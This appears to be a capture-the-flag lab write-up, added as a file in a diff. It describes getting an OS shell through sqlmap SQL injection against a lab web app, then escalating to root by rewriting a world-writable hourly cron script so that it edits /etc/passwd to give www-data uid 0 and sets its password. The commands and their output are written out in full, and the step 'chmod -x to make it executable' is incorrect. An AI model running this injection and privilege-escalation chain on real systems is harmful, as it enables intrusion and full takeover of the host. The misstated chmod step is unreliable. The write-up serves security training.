@@ -1,0 +1,142 @@
+This is also very similar to the flag 3b2000, also starts off by going to the
+os shell thru the sqlmap which is 
+
+so the new command for this is by using the os shell feature of sqlmap
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --os-shell --batch
+
+and just replace that with new cookie that u get everytime
+
+once u login, your username is 
+
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: 'www-data'
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+os-shell> 
+
+
+so youre www-data, but to gain access to do stuff over the host, u need root access
+so were supposed to do privelege escalation
+
+so we find stuff in crontab that get run based on schedule which you have 
+write access to
+
+os-shell> ls -la /etc/cron.*
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+/etc/cron.d:
+total 20
+drwxr-xr-x   2 root root 4096 Aug 21 01:04 .
+drwxr-xr-x 104 root root 4096 Oct  8 23:40 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
+-rw-r--r--   1 root root  712 Jan 28  2022 php
+
+/etc/cron.daily:
+total 40
+drwxr-xr-x   2 root root 4096 Aug 21 01:03 .
+drwxr-xr-x 104 root root 4096 Oct  8 23:40 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root  564 Sep 26  2020 acct
+-rwxr-xr-x   1 root root  539 Mar 18  2024 apache2
+-rwxr-xr-x   1 root root  376 Jul 24  2023 apport
+-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
+-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
+-rwxr-xr-x   1 root root  377 Jan 24  2022 logrotate
+-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x   2 root     root     4096 Aug 21 01:26 .
+drwxr-xr-x 104 root     root     4096 Oct  8 23:40 ..
+-rw-r--r--   1 root     root      102 Mar 23  2022 .placeholder
+-rwxrwxrwx   1 www-data www-data   12 Oct  8 23:42 cuiteur-cleaning
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x   2 root root 4096 Aug  7 22:32 .
+drwxr-xr-x 104 root root 4096 Oct  8 23:40 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root 2203 Sep 26  2020 acct
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x   2 root root 4096 Jan 28  2025 .
+drwxr-xr-x 104 root root 4096 Oct  8 23:40 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
+---
+
+
+so in cron hourly there is a file which has write access to www-data
+this file is being run by root but has write access to us, making it a entry point to
+get root privileges
+
+so I edited the file /etc/cron.hourly/cuiteur-cleaning to grant myself root access
+as follows
+
+echo '#!/bin/bash' > /etc/cron.hourly/cuiteur-cleaning
+rewrites the whole file which the mentioned under ''(rewrites cuz we're using >
+appends if we're using >>)
+
+sed -i 's#www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin#www-data:x:0:0:root:/root:/bin/bash#' /etc/passwd
+echo "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" >> /etc/passwd
+echo "www-data:password123" | chpasswd
+
+echo these three commands into the cuiteur cleaning file and chmod -x to make it 
+executable again
+
+the first command uses sed to find and replace the current uID of www-data with the
+same uID as root in the file etc/passwd, where all user and user priveleges are stored
+the second command appends the command to assign www-data the old uID the device 
+remembers, so this makes www-data has 2 uIDs, making that user act as root and normal
+third command adds a password to the root login for www-data and the password I set
+was password123. Wait for this cron job to run and then once it run try with the 
+following command
+
+cat /etc/passwd
+should show 2 entries for www-data and one with uID 0 and one with 33
+
+if its there
+
+echo 'password123' | su www-data -c 'ls -la /root/'
+ and flag should be there
+
+to download the flag i did chmod 644 to change file permissions copied it to the 
+current directory and then did wget and boom, flag on my pc
+
+
+To check whcih cron job runs when
+
+os-shell> cat /etc/crontab
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+---
+ 
